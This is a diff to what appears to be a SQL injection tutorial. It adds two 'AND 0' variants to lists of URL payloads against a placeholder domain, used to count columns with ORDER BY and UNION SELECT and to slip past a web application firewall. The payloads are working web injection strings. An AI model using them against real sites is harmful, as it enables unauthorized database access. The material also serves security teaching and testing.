@@ -84,6 +84,7 @@ This query musn't shows up error, since there is no lower number than 1
 ```http://domain.com/index.php?id=1\ order by 1-- -```  
 ```http://domain.com/index.php?id=1' order by 1 asc-- -```  
 ```http://domain.com/index.php?id=1' group by 1 asc-- -```  
+```http://domain.com/index.php?id=1' AND 0 order by 1-- -```  
     
     - If none of the payloads didn't bypass WAF, try again the payloads by following the 2 rules below:
       - Add a minus (-) before 1 (example: ```?id=-1' /**/ORDER/**/BY/**/ 1-- -```)  
@@ -114,6 +115,7 @@ Using a simple query, we determine which of the 4 columns reflect our input usin
 ```http://domain.com/index.php?id=.1' Union Select 1,2,3,4-- -```  
 ```http://domain.com/index.php?id=-1' div 0' Union Select 1,2,3,4-- -```  
 ```http://domain.com/index.php?id=1' Union Select 1,2,3,4 desc-- -```  
+```http://domain.com/index.php?id=1' AND 0 Union Select 1,2,3,4-- -```  
 
 Website must successfully load and we will see a number (in our case between 1-4)  
 
